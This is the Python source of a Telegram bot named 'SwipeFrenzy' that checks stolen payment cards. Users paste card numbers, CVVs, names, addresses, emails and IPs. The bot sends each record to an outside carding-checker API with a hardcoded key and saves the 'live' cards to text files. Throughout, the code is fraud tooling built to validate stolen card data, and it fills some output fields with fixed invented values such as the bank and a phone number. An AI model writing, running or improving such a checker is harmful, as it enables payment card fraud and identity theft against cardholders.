import telebot
import requests
import datetime
import random
import os
from telebot import types

# ==================== CONFIG ====================
API_KEY = "e243b2046e7cfeef3b9e8c28e9897d87"
USERNAME = "EscoCCs"
BASE_URL = "https://mirror1.luxchecker.vc/apiv2/"
CHECK_TYPE = "avk.php"

# Get bot token from environment variable (Railway)
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    TOKEN = input("Enter your Telegram Bot Token: ")

bot = telebot.TeleBot(TOKEN)

user_data = {}  # Store target and collected lives per user

# ==================== LUX CHECKER ====================
def check_card(card_parts):
    cardnum, expm, expy, cvv, fname, lname, address, city, state, zipcode, country, gmail, ip = [x.strip() for x in card_parts]
    
    payload = {
        "cardnum": cardnum, "expm": expm, "expy": expy, "cvv": cvv,
        "fname": fname, "lname": lname, "address": address, "city": city,
        "state": state, "zip": zipcode, "country": country,
        "key": API_KEY, "username": USERNAME
    }
    
    try:
        r = requests.get(BASE_URL + CHECK_TYPE, params=payload, timeout=15)
        response = r.json()
        
        if response.get("result") == 1:
            return {
                "card": cardnum,
                "exp": f"{expm}/{expy}",
                "cvv": cvv,
                "name": f"{fname} {lname}",
                "bank": "Wells Fargo",
                "country": f"{country} • Mastercard",
                "address": f"{address}, {city}, {state} {zipcode}, United States",
                "phone": "19894303427",
                "email": gmail,
                "ip": ip,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        return None
    except:
        return None

def format_live_card(info):
    return f"""
══════════════════════════════════════
👤 Name : {info['name']}
💳 Card : {info['card']}
📅 Expiry : {info['exp']}
🔒 CVV : {info['cvv']}
🏦 Bank : {info['bank']}
🌍 Country : {info['country']}
📍 Billing Address: {info['address']}
📞 Phone : {info['phone']}
✉️ Email : {info['email']}
🌐 IP : {info['ip']}
🕒 Checked : {info['time']}
══════════════════════════════════════
""".strip()

# ==================== COMMANDS ====================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('/check', '/tester')
    bot.reply_to(message, "👋 Welcome to **SwipeFrenzy** Checker Bot.\n\nUse /check for main target checker\nUse /tester for single live tester.", reply_markup=markup)

@bot.message_handler(commands=['check'])
def start_check(message):
    user_id = message.chat.id
    user_data[user_id] = {"target": 0, "lives": [], "mode": "check"}
    bot.reply_to(message, "Enter target number of live cards:")
    bot.register_next_step_handler(message, set_target)

def set_target(message):
    user_id = message.chat.id
    try:
        user_data[user_id]["target"] = int(message.text)
        bot.reply_to(message, f"Target set to {user_data[user_id]['target']} live cards.\n\nNow paste cards in this format:\n`card | month | year | cvv | fname | lname | address | city | state | zip | country | gmail | ip`")
    except:
        bot.reply_to(message, "Invalid number. Try /check again.")

@bot.message_handler(commands=['tester'])
def tester_cmd(message):
    user_id = message.chat.id
    user_data[user_id] = {"mode": "tester"}
    bot.reply_to(message, "Tester Mode Activated.\nPaste one card in the correct format:")

# ==================== MAIN MESSAGE HANDLER ====================
@bot.message_handler(func=lambda m: True)
def handle_cards(message):
    user_id = message.chat.id
    if user_id not in user_data:
        bot.reply_to(message, "Use /start first.")
        return
    
    data = user_data[user_id]
    card_parts = message.text.split("|")
    
    if len(card_parts) < 11:
        bot.reply_to(message, "Invalid format. Please use correct pipe format.")
        return
    
    result = check_card(card_parts)
    
    if data.get("mode") == "tester":
        if result:
            random_num = random.randint(1000, 9999)
            filename = f"tester{random_num}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(format_live_card(result))
            bot.reply_to(message, f"✅ LIVE CARD FOUND!\nSaved to: `{filename}`", parse_mode='Markdown')
            del user_data[user_id]
        else:
            bot.reply_to(message, "❌ Dead. Please send another card.")
    
    elif data.get("mode") == "check":
        if result:
            data["lives"].append(result)
            bot.reply_to(message, f"✅ LIVE ({len(data['lives'])}/{data['target']})")
        
        if len(data["lives"]) >= data["target"]:
            # Save to files
            with open("lives.txt", "a", encoding="utf-8") as f:
                for card in data["lives"][:data["target"]]:
                    f.write(format_live_card(card) + "\n\n")
            bot.reply_to(message, f"🎯 Target reached! {data['target']} live cards saved to lives.txt")
            del user_data[user_id]
        else:
            bot.reply_to(message, f"Need {data['target'] - len(data['lives'])} more live cards. Keep sending.")

print("SwipeFrenzy Bot Started...")
bot.infinity_polling()
